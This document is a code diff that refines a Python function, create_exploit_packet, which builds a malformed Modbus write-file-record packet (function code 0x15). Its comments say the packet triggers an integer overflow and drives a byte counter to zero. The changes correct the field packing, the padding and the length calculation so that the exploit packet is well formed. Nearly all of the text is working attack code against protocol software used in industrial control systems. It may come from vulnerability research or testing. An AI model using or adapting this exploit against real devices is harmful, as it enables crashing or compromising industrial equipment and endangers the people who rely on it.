@@ -9,7 +9,7 @@ def create_exploit_packet():
     function_code = 0x15
 
     # First group
-    reference_type_1 = 0x00
+    reference_type_1 = 0x06
     file_number_1 = 0x0004
     record_number_1 = 0x0000
     record_length_1 = 0xfffe  # Trigger integer overflow
@@ -17,7 +17,7 @@ def create_exploit_packet():
     record_length_2 = 0xfffb  # Cause bytes_processed to become 0
     
     # Append first group
-    payload = struct.pack('>HHHH',
+    payload = struct.pack('>BHHH',
                            reference_type_1,
                            file_number_1,
                            record_number_1,
@@ -27,13 +27,13 @@ def create_exploit_packet():
     # Append second group
     payload += struct.pack('>H',
                            record_length_2)
-    payload += b'\x7F' +  b'\x00'*19 # Minimum 1 bytes of data for the second group
+    payload += b'\x7F' +  b'\x00'*21 # Minimum 1 bytes of data for the second group
 
     # Calculate request_data_length
-    request_data_length = 0x20  # Subtract function_code byte
+    request_data_length = len(payload)  # Subtract function_code byte
 
     # Construct final payload with correct request_data_length
-    final_payload = struct.pack('>BB', function_code, request_data_length) + payload[1:]
+    final_payload = struct.pack('>BB', function_code, request_data_length) + payload
     
     return final_payload
 
